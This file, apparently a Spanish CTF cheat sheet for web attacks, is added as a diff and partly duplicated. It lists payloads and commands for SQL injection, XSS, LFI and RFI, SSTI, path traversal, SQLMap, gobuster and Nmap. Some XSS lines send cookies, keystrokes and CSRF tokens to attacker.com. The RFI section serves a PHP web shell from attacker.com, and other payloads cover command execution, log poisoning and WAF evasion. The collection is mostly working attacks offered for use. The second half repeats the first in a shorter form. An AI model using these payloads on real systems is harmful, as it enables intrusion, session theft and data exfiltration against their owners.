@@ -1,0 +1,645 @@
+Apuntes para CTF: Categoría Web
+1. SQL Injection (SQLi)
+Las inyecciones SQL son una técnica para manipular consultas SQL enviando entradas maliciosas a un formulario o parámetro. El objetivo es alterar la lógica de la consulta para obtener datos sensibles, autenticarse sin credenciales o incluso modificar la base de datos.
+Ejemplo Básico
+
+Payload: ' OR '1'='1  
+Explicación: Al ingresar esto en un campo de usuario o contraseña, la consulta SQL podría convertirse en algo como:SELECT * FROM users WHERE username = '' OR '1'='1';Esto siempre es verdadero, permitiendo el acceso sin credenciales válidas.
+
+
+
+Otros Payloads Comunes
+
+Autenticación sin contraseña:' OR '1'='1' -- (El -- comenta el resto de la consulta).Ejemplo: SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --';
+Obtener datos de otras tablas:' UNION SELECT 1, username, password FROM users --  
+Une los resultados de la consulta original con los de otra tabla.
+
+
+Enumerar columnas:' ORDER BY 1--, ' ORDER BY 2--, etc., hasta que falle (para saber cuántas columnas hay).Ejemplo: Si ORDER BY 4 falla, hay 3 columnas.
+Obtener versión de la base de datos:  
+MySQL: ' UNION SELECT 1, @@version, 3 --  
+PostgreSQL: ' UNION SELECT 1, version(), 3 --  
+SQL Server: ' UNION SELECT 1, @@version, 3 --
+
+
+Ejecutar comandos (si hay permisos):  
+MySQL: ' INTO OUTFILE '/var/www/html/shell.php' -- (Escribir un archivo en el servidor).  
+SQL Server: ' EXEC xp_cmdshell 'whoami'; --
+
+
+
+Técnicas Avanzadas
+
+Blind SQL Injection: Cuando no hay salida directa, usa condiciones booleanas o tiempo.  
+Booleano: ' AND 1=1 -- (verdadero) vs ' AND 1=2 -- (falso).  
+Basado en tiempo: ' AND IF(1=1, SLEEP(5), 0) -- (retraso de 5 segundos si es verdadero).
+
+
+Error-Based SQLi: Provoca errores para extraer información.Ejemplo: ' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --
+Out-of-Band SQLi: Usa canales externos como DNS o HTTP.Ejemplo: ' AND (SELECT * FROM users) TO outfile '\\\\attacker.com\share\' --
+
+Automatización con SQLMap
+SQLMap es una herramienta para automatizar la detección y explotación de SQLi.
+Comandos Básicos
+
+Probar un parámetro GET:sqlmap -u "http://target.com/page.php?id=1" --dbs  
+Enumera las bases de datos disponibles.
+
+
+Probar un formulario POST:sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs  
+Envía datos POST y busca inyecciones.
+
+
+Especificar una tabla:sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump  
+Extrae los datos de una tabla específica.
+
+
+Ejecutar comandos en el sistema:sqlmap -u "http://target.com/page.php?id=1" --os-shell  
+Intenta obtener una shell interactiva (si hay permisos).
+
+
+
+Opciones Útiles
+
+--level=5 --risk=3: Aumenta la intensidad de las pruebas (más payloads, más parámetros).  
+--tamper=space2comment: Bypassea filtros reemplazando espacios con comentarios (/**/).  
+--cookie="session=abc123": Incluye cookies para pruebas autenticadas.  
+--random-agent: Usa un User-Agent aleatorio para evitar bloqueos.  
+--batch: Responde automáticamente a las preguntas de SQLMap.  
+--threads=10: Aumenta la velocidad usando múltiples hilos (cuidado con bloqueos).  
+--dbms=mysql: Especifica el tipo de base de datos para optimizar las pruebas.  
+--technique=B: Fuerza pruebas específicas (B: Booleano, E: Error, U: Union, S: Stacked, T: Tiempo).  
+--delay=2: Añade un retraso de 2 segundos entre solicitudes para evitar detección.  
+--proxy=http://127.0.0.1:8080: Usa un proxy (como Burp Suite) para inspeccionar tráfico.  
+--tamper=apostrophemask,base64encode: Usa múltiples scripts de tamper para evadir WAFs.  
+Ejemplo: sqlmap -u "http://target.com/page.php?id=1" --tamper=apostrophemask,base64encode --dbs
+
+
+--dump-all: Extrae todas las bases de datos, tablas y datos.  
+--sql-shell: Abre una consola SQL interactiva si la inyección lo permite.  
+--ignore-code=403: Ignora respuestas HTTP 403 para continuar escaneando.  
+--second-order: Prueba inyecciones de segundo orden (payloads que se ejecutan en otra página).
+
+Tamper Scripts Útiles
+
+apostrophemask: Reemplaza apóstrofes con codificación UTF-8.  
+base64encode: Codifica el payload en base64.  
+charencode: Codifica cada carácter en su equivalente URL.  
+randomcase: Alterna mayúsculas y minúsculas para evadir filtros sensibles a case.  
+space2dash: Reemplaza espacios con guiones (--).  
+Ejemplo: sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase --dbs
+
+Consejos
+
+Captura solicitudes con Burp Suite y pásalas a SQLMap con -r request.txt.  
+Si hay WAF, combina múltiples tamper scripts y ajusta --delay o --threads.  
+Revisa los logs de SQLMap (~/.sqlmap/output/) para analizar resultados.  
+Usa --crawl=2 para que SQLMap explore el sitio web y busque más puntos de inyección.
+
+Consejos Generales para SQLi
+
+Usa Burp Suite para interceptar y modificar solicitudes POST.  
+Prueba payloads en todos los parámetros (GET, POST, cookies, headers).  
+Si hay WAF, prueba codificar los payloads (URL encode, doble URL encode, etc.).
+
+2. Cross-Site Scripting (XSS)
+XSS permite inyectar scripts maliciosos en páginas web vistas por otros usuarios. Hay tres tipos principales: Reflejado, Persistente y DOM-based.
+Payloads Comunes
+
+Básico: <script>alert('XSS')</script>  
+Prueba si el input se refleja sin sanitización.
+
+
+Evadir filtros de etiquetas:  
+<img src=x onerror=alert('XSS')>  
+<svg onload=alert('XSS')>  
+<body onload=alert('XSS')>
+
+
+Evadir filtros de comillas:  
+<img src=javascript:alert('XSS')>  
+<input type=image src=1 onerror=alert('XSS')>
+
+
+Evadir filtros de palabras clave:  
+<scr<script>ipt>alert('XSS')</scr<script>ipt>  
+onerror=al\u0065rt('XSS') (codificación Unicode).
+
+
+DOM-based XSS:  
+http://target.com/#<script>alert('XSS')</script>  
+Prueba parámetros en la URL que se procesan en el cliente.
+
+
+
+Técnicas Avanzadas
+
+Cookie Stealing:<script>document.location='http://attacker.com?cookie='+document.cookie</script>  
+Roba las cookies de la víctima.
+
+
+Keylogging:<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>  
+Registra las teclas presionadas.
+
+
+CSRF Token Theft:<script>var t=document.querySelector('[name=csrf-token]').value;fetch('http://attacker.com?t='+t)</script>  
+Extrae tokens CSRF para ataques posteriores.
+
+
+Bypassing WAF:  
+Usa codificación: <script>eval(atob('YWxlcnQoJ1hTUycp'))</script> (base64).  
+Divide el payload: <scr>ipt>alert('XSS')</scr>ipt>.  
+Usa eventos raros: <details ontoggle=alert('XSS')>.
+
+
+
+Consejos
+
+Prueba en todos los campos (search, forms, headers como Referer, User-Agent).  
+Usa Burp Suite Intruder con listas como xss-payloads.txt para automatizar.  
+Si el payload no se ejecuta, revisa si se escapa (< → &lt;) o se elimina.  
+Para XSS persistente, busca formularios que guarden datos (comentarios, perfiles).
+
+3. Local File Inclusion (LFI)
+LFI permite incluir archivos locales del servidor en la respuesta, a menudo debido a parámetros como ?file=page.php.
+Payloads Comunes
+
+Básico: ?file=../../../etc/passwd  
+Intenta leer /etc/passwd en Linux.
+
+
+Con NUL byte: ?file=../../../etc/passwd%00  
+Termina la cadena en sistemas antiguos.
+
+
+Archivos sensibles:  
+Linux: ?file=../../../proc/self/environ (variables de entorno).  
+Windows: ?file=../../../windows/system32/drivers/etc/hosts.  
+PHP: ?file=../../../var/log/apache2/access.log (si los logs son accesibles).
+
+
+
+Bypasses
+
+Filtros de ../:  
+?file=....//....//etc/passwd  
+?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL encode).  
+?file=..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts (Windows).
+
+
+Filtros de extensión:  
+?file=../../../etc/passwd%00.php  
+?file=../../../etc/passwd/. (punto final confunde algunos sistemas).
+
+
+
+Escalamiento a RCE
+
+Logs Poisoning:  
+Inyecta PHP en el User-Agent: <?php system($_GET['cmd']); ?>.  
+Accede al log: ?file=../../../var/log/apache2/access.log&cmd=id.
+
+
+/proc/self/environ:  
+Inyecta código vía User-Agent y accede: ?file=../../../proc/self/environ.
+
+
+Session Files:  
+Si conoces la ruta de sesiones (/tmp/sess_xxx), inyecta código y accede:?file=../../../tmp/sess_abc123.
+
+
+
+Consejos
+
+Enumera rutas con payloads de Path Traversal.  
+Usa Burp Suite para probar múltiples archivos sensibles.  
+Revisa el código fuente para identificar rutas relativas o absolutas.
+
+4. Remote File Inclusion (RFI)
+RFI permite incluir archivos remotos, ejecutando código controlado por el atacante.
+Payloads Comunes
+
+Básico: ?file=http://attacker.com/shell.php  
+Incluye un script malicioso alojado en tu servidor.
+
+
+Con NUL byte: ?file=http://attacker.com/shell.txt%00  
+Evita la concatenación de extensiones.
+
+
+Usando protocolos alternativos:  
+?file=ftp://attacker.com/shell.php  
+?file=php://input con POST: <?php system($_GET['cmd']); ?>.
+
+
+
+Configuración del Servidor Atacante
+
+Crea un archivo shell.php:  <?php system($_GET['cmd']); ?>
+
+
+Aloja en tu servidor (por ejemplo, con python3 -m http.server 80).  
+Accede: ?file=http://attacker.com/shell.php&cmd=id.
+
+Bypasses
+
+Filtros de protocolo:  
+?file=hxxp://attacker.com/shell.php (reemplaza http con hxxp).  
+?file=//attacker.com/shell.php (sin protocolo).
+
+
+Filtros de extensión:  
+?file=http://attacker.com/shell.php%00  
+?file=http://attacker.com/shell.txt.
+
+
+
+Consejos
+
+Asegúrate de que allow_url_include y allow_url_fopen estén habilitados en el servidor vulnerable.  
+Usa un dominio confiable para evitar bloqueos de firewall.  
+Prueba con payloads pequeños antes de escalar a una shell completa.
+
+5. Server-Side Template Injection (SSTI)
+SSTI ocurre cuando un motor de plantillas (como Jinja2, Twig) procesa entradas del usuario sin sanitización, permitiendo ejecutar código en el servidor.
+Detección
+
+Prueba básica: {{7*7}}  
+Si devuelve 49, es probable que haya un motor de plantillas vulnerable.
+
+
+Identificar el motor:  
+Jinja2 (Python): {{''.__class__.__mro__[1].__subclasses__()}}  
+Twig (PHP): {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}  
+Freemarker (Java): ${"freemarker.template.utility.Execute"?new()("id")}
+
+
+
+Payloads Comunes
+
+Jinja2 (Python):  
+Listar clases: {{''.__class__.__mro__[1].__subclasses__()}}  
+Ejecutar comandos:{{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['popen']('id').read()}}  
+Leer archivos:{{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['open']('/etc/passwd').read()}}
+
+
+Twig (PHP):  
+Ejecutar comandos: {{system('id')}}  
+Leer archivos: {{file_get_contents('/etc/passwd')}}
+
+
+Freemarker (Java):  
+Ejecutar comandos: ${"freemarker.template.utility.Execute"?new()("whoami")}
+
+
+
+Bypasses
+
+Filtros de llaves: Usa codificación: {% print 7*7 %} o ${7*7}.  
+Palabras clave bloqueadas:  
+Usa concatenación: {{''.__cl''+''ass__.__mr''+''o__[1]}}.  
+Usa métodos alternativos: {{request.__class__.__mro__[1]}}.
+
+
+WAF: Codifica en base64 o usa comentarios: {{/*7*7*/}}.
+
+Consejos
+
+Identifica el motor de plantillas revisando el código fuente o errores.  
+Usa payloads específicos para cada motor (Jinja2, Twig, etc.).  
+Escala a RCE si el motor permite acceder a funciones del sistema.
+
+6. Archivos y Directorios Comunes
+Buscar archivos y directorios sensibles es clave para encontrar configuraciones expuestas o puntos de entrada.
+Archivos a Buscar
+
+.htaccess: Configuración del servidor Apache. Puede revelar reglas de acceso o contraseñas.  
+Ruta: /.htaccess
+
+
+robots.txt: Indica qué rutas no deben ser rastreadas por bots. Puede contener rutas interesantes.  
+Ruta: /robots.txt
+
+
+.gitignore: Archivos ignorados por Git. Puede listar archivos sensibles.  
+Ruta: /.gitignore
+
+
+config.php / config.inc.php: Archivos de configuración con credenciales de bases de datos.  
+Rutas: /config.php, /inc/config.inc.php, /application/config.php
+
+
+.env: Variables de entorno con claves API, contraseñas, etc.  
+Ruta: /.env
+
+
+phpinfo.php: Expone información del servidor (PHP, módulos, variables).  
+Ruta: /phpinfo.php, /info.php
+
+
+backup files: Copias de seguridad con datos sensibles.  
+Ejemplo: /backup.sql, /site.bak, /db_backup.tar.gz
+
+
+Archivos de logs: Pueden contener información sensible.  
+Ejemplo: /access.log, /error.log, /logs/app.log
+
+
+
+Directorios a Buscar
+
+Admin panels: /admin, /administrator, /wp-admin, /login, /panel
+Backups: /backup, /backups, /archive
+Configuración: /config, /conf, /settings
+Uploads: /uploads, /files, /media (puede permitir subir webshells).
+Debug: /debug, /test, /dev
+
+Herramientas
+
+Gobuster: Escanea directorios y archivos.  
+Comando: gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+
+ffuf: Similar a Gobuster, pero más rápido y flexible.  
+Comando: ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+
+dirsearch: Escáner de directorios con soporte para extensiones.  
+Comando: dirsearch -u http://target.com -e php,html,txt
+
+
+
+7. Path Traversal (Directory Traversal)
+El objetivo es acceder a archivos fuera del directorio web raíz usando secuencias como ../.
+Payloads Comunes
+
+Básico: ../../etc/passwd  
+Intenta leer /etc/passwd en servidores Linux.
+
+
+Variaciones:  
+../../../etc/passwd (más niveles arriba).  
+..//..//etc/passwd (bypassea filtros que eliminan ../).  
+.../.../etc/passwd (bypassea filtros simples).  
+%2e%2e%2fetc%2fpasswd (codificación URL de ../).  
+....//....//etc/passwd (confunde algunos filtros).
+
+
+Windows:  
+..\windows\system32\drivers\etc\hosts  
+..\..\boot.ini
+
+
+
+Archivos a Buscar
+
+Linux:  
+/etc/passwd (lista de usuarios).  
+/etc/shadow (contraseñas hasheadas, si hay permisos).  
+/proc/self/environ (variables de entorno).  
+/home/user/.ssh/id_rsa (claves SSH privadas).
+
+
+Windows:  
+C:\Windows\System32\config\SAM (base de datos de usuarios).  
+C:\Windows\repair\system (configuración del sistema).  
+C:\inetpub\wwwroot\web.config (configuración IIS).
+
+
+
+Bypasses
+
+Filtros de ../: Usa ..%2f, ..%5c, ..././, ....//.  
+Filtros de palabras clave: Usa codificación doble (%252e%252e%252f) o caracteres Unicode.  
+NUL byte: ../../etc/passwd%00 (termina la cadena en algunos sistemas antiguos).
+
+8. Escaneo con Nmap
+Nmap es una herramienta para descubrir hosts, puertos y servicios en una red. En CTF, úsalo para identificar servicios web vulnerables.
+Comandos Básicos
+
+Escaneo de puertos:nmap -p- target.com (escanea todos los puertos).nmap -p 80,443 target.com (escanea puertos específicos).
+Detección de servicios:nmap -sV target.com (identifica versiones de servicios).nmap -sV -p 80,443 target.com (solo puertos web).
+Scripts NSE:nmap --script=http-enum target.com (enumera directorios y archivos web).nmap --script=http-vuln* target.com (busca vulnerabilidades web conocidas).
+Escaneo sigiloso:nmap -sS -T2 target.com (SYN scan, más lento para evitar detección).
+
+Consejos
+
+Usa -oN output.txt para guardar los resultados.  
+Si hay firewall, prueba --script=http-waf-detect para detectar WAF.  
+Combina con otras herramientas (como Nikto) para análisis web.
+
+Notas Generales
+
+Burp Suite: Intercepta y modifica solicitudes HTTP. Usa el repeater para probar payloads manualmente.  
+WAF Bypasses: Prueba codificaciones (URL, base64, Unicode), cambios de método (GET a POST), o parámetros inesperados.  
+Wordlists: Usa listas como rockyou.txt para contraseñas y dirb/common.txt para directorios.  
+Documentación: Lleva un registro de los payloads y comandos que funcionan para cada desafío.
+
+
+
+Apuntes para CTF: Categoría Web
+1. SQL Injection (SQLi)
+Las inyecciones SQL son una técnica para manipular consultas SQL enviando entradas maliciosas a un formulario o parámetro. El objetivo es alterar la lógica de la consulta para obtener datos sensibles, autenticarse sin credenciales o incluso modificar la base de datos.
+Ejemplo Básico
+
+Payload: ' OR '1'='1  
+Explicación: Al ingresar esto en un campo de usuario o contraseña, la consulta SQL podría convertirse en algo como:SELECT * FROM users WHERE username = '' OR '1'='1';Esto siempre es verdadero, permitiendo el acceso sin credenciales válidas.
+
+
+
+Otros Payloads Comunes
+
+Autenticación sin contraseña:' OR '1'='1' -- (El -- comenta el resto de la consulta).Ejemplo: SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --';
+Obtener datos de otras tablas:' UNION SELECT 1, username, password FROM users --  
+Une los resultados de la consulta original con los de otra tabla.
+
+
+Enumerar columnas:' ORDER BY 1--, ' ORDER BY 2--, etc., hasta que falle (para saber cuántas columnas hay).Ejemplo: Si ORDER BY 4 falla, hay 3 columnas.
+Obtener versión de la base de datos:  
+MySQL: ' UNION SELECT 1, @@version, 3 --  
+PostgreSQL: ' UNION SELECT 1, version(), 3 --  
+SQL Server: ' UNION SELECT 1, @@version, 3 --
+
+
+Ejecutar comandos (si hay permisos):  
+MySQL: ' INTO OUTFILE '/var/www/html/shell.php' -- (Escribir un archivo en el servidor).  
+SQL Server: ' EXEC xp_cmdshell 'whoami'; --
+
+
+
+Técnicas Avanzadas
+
+Blind SQL Injection: Cuando no hay salida directa, usa condiciones booleanas o tiempo.  
+Booleano: ' AND 1=1 -- (verdadero) vs ' AND 1=2 -- (falso).  
+Basado en tiempo: ' AND IF(1=1, SLEEP(5), 0) -- (retraso de 5 segundos si es verdadero).
+
+
+Error-Based SQLi: Provoca errores para extraer información.Ejemplo: ' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --
+Out-of-Band SQLi: Usa canales externos como DNS o HTTP.Ejemplo: ' AND (SELECT * FROM users) TO outfile '\\\\attacker.com\share\' --
+
+Consejos
+
+Usa herramientas como Burp Suite para interceptar y modificar solicitudes POST.
+Prueba payloads en todos los parámetros (GET, POST, cookies, headers).
+Si hay WAF, prueba codificar los payloads (URL encode, doble URL encode, etc.).
+
+2. Archivos y Directorios Comunes
+Buscar archivos y directorios sensibles es clave para encontrar configuraciones expuestas o puntos de entrada.
+Archivos a Buscar
+
+.htaccess: Configuración del servidor Apache. Puede revelar reglas de acceso o contraseñas.  
+Ruta: /.htaccess
+
+
+robots.txt: Indica qué rutas no deben ser rastreadas por bots. Puede contener rutas interesantes.  
+Ruta: /robots.txt
+
+
+.gitignore: Archivos ignorados por Git. Puede listar archivos sensibles.  
+Ruta: /.gitignore
+
+
+config.php / config.inc.php: Archivos de configuración con credenciales de bases de datos.  
+Rutas: /config.php, /inc/config.inc.php, /application/config.php
+
+
+.env: Variables de entorno con claves API, contraseñas, etc.  
+Ruta: /.env
+
+
+phpinfo.php: Expone información del servidor (PHP, módulos, variables).  
+Ruta: /phpinfo.php, /info.php
+
+
+backup files: Copias de seguridad con datos sensibles.  
+Ejemplo: /backup.sql, /site.bak, /db_backup.tar.gz
+
+
+Archivos de logs: Pueden contener información sensible.  
+Ejemplo: /access.log, /error.log, /logs/app.log
+
+
+
+Directorios a Buscar
+
+Admin panels: /admin, /administrator, /wp-admin, /login, /panel
+Backups: /backup, /backups, /archive
+Configuración: /config, /conf, /settings
+Uploads: /uploads, /files, /media (puede permitir subir webshells).
+Debug: /debug, /test, /dev
+
+Herramientas
+
+Gobuster: Escanea directorios y archivos.  
+Comando: gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+
+ffuf: Similar a Gobuster, pero más rápido y flexible.  
+Comando: ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+
+dirsearch: Escáner de directorios con soporte para extensiones.  
+Comando: dirsearch -u http://target.com -e php,html,txt
+
+
+
+3. Path Traversal (Directory Traversal)
+El objetivo es acceder a archivos fuera del directorio web raíz usando secuencias como ../.
+Payloads Comunes
+
+Básico: ../../etc/passwd  
+Intenta leer /etc/passwd en servidores Linux.
+
+
+Variaciones:  
+../../../etc/passwd (más niveles arriba).  
+..//..//etc/passwd (bypassea filtros que eliminan ../).  
+.../.../etc/passwd (bypassea filtros simples).  
+%2e%2e%2fetc%2fpasswd (codificación URL de ../).  
+....//....//etc/passwd (confunde algunos filtros).
+
+
+Windows:  
+..\windows\system32\drivers\etc\hosts  
+..\..\boot.ini
+
+
+
+Archivos a Buscar
+
+Linux:  
+/etc/passwd (lista de usuarios).  
+/etc/shadow (contraseñas hasheadas, si hay permisos).  
+/proc/self/environ (variables de entorno).  
+/home/user/.ssh/id_rsa (claves SSH privadas).
+
+
+Windows:  
+C:\Windows\System32\config\SAM (base de datos de usuarios).  
+C:\Windows\repair\system (configuración del sistema).  
+C:\inetpub\wwwroot\web.config (configuración IIS).
+
+
+
+Bypasses
+
+Filtros de ../: Usa ..%2f, ..%5c, ..././, ....//.  
+Filtros de palabras clave: Usa codificación doble (%252e%252e%252f) o caracteres Unicode.  
+NUL byte: ../../etc/passwd%00 (termina la cadena en algunos sistemas antiguos).
+
+4. Escaneo con Nmap
+Nmap es una herramienta para descubrir hosts, puertos y servicios en una red. En CTF, úsalo para identificar servicios web vulnerables.
+Comandos Básicos
+
+Escaneo de puertos:nmap -p- target.com (escanea todos los puertos).nmap -p 80,443 target.com (escanea puertos específicos).
+Detección de servicios:nmap -sV target.com (identifica versiones de servicios).nmap -sV -p 80,443 target.com (solo puertos web).
+Scripts NSE:nmap --script=http-enum target.com (enumera directorios y archivos web).nmap --script=http-vuln* target.com (busca vulnerabilidades web conocidas).
+Escaneo sigiloso:nmap -sS -T2 target.com (SYN scan, más lento para evitar detección).
+
+Consejos
+
+Usa -oN output.txt para guardar los resultados.  
+Si hay firewall, prueba --script=http-waf-detect para detectar WAF.  
+Combina con otras herramientas (como Nikto) para análisis web.
+
+5. Automatización de SQL Injection con SQLMap
+SQLMap es una herramienta para automatizar la detección y explotación de SQLi.
+Comandos Básicos
+
+Probar un parámetro GET:sqlmap -u "http://target.com/page.php?id=1" --dbs  
+Enumera las bases de datos disponibles.
+
+
+Probar un formulario POST:sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs  
+Envía datos POST y busca inyecciones.
+
+
+Especificar una tabla:sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump  
+Extrae los datos de una tabla específica.
+
+
+Ejecutar comandos en el sistema:sqlmap -u "http://target.com/page.php?id=1" --os-shell  
+Intenta obtener una shell interactiva (si hay permisos).
+
+
+
+Opciones Útiles
+
+--level=5 --risk=3: Aumenta la intensidad de las pruebas.  
+--tamper=space2comment: Bypassea filtros reemplazando espacios con comentarios (/**/).
+--cookie="session=abc123": Incluye cookies para pruebas autenticadas.  
+--random-agent: Usa un User-Agent aleatorio para evitar bloqueos.  
+--batch: Responde automáticamente a las preguntas de SQLMap.
+
+Consejos
+
+Captura solicitudes con Burp Suite y pásalas a SQLMap con -r request.txt.  
+Si hay WAF, usa --tamper con scripts como apostrophemask o randomcase.  
+Revisa los logs de SQLMap (~/.sqlmap/output/) para analizar resultados.
+
+Notas Generales
+
+Burp Suite: Intercepta y modifica solicitudes HTTP. Usa el repeater para probar payloads manualmente.  
+WAF Bypasses: Prueba codificaciones (URL, base64, Unicode), cambios de método (GET a POST), o parámetros inesperados.  
+Wordlists: Usa listas como rockyou.txt para contraseñas y dirb/common.txt para directorios.  
+Documentación: Lleva un registro de los payloads y comandos que funcionan para cada desafío.
